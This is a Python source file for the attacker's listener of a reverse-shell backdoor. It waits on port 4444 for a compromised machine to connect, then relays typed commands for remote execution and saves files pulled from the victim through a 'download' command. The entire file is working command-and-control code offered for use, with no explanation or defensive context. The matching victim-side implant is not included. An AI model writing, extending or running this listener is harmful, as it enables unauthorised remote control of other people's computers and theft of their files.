import socket, json
import termcolor
import base64


class Listener:
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip, port))
		listener.listen(0)
		print("[+] Waiting for incoming connections")
		self.connection, address = listener.accept()
		print("[+] Got a connection from " + str(address))

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(bytes(json_data, "utf-8"))

	def reliable_recive(self):
		json_data = ""
		while True:
			try:
				json_data += self.connection.recv(1024).decode("utf-8")
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_remotely(self, command):
		self.reliable_send(command)
		command = command.split()
		if command[0] == "exit":
			self.connection.close()
			exit()
		return self.reliable_recive()

	def write_file(self, path, content):
		content = base64.b64decode(content)
		with open(path, "wb") as file:
			file.write(content)
			print("[+] Download succsessful")
	
	def run(self):
		while True:
			command = input(termcolor.colored("user $ ", "cyan"))
			result = self.execute_remotely(command)
			
			if command.split()[0] == "download":
				command = command.split()
				self.write_file(command[1], result)
			else:
				print(result)

my_listener = Listener("localhost", 4444)
my_listener.run()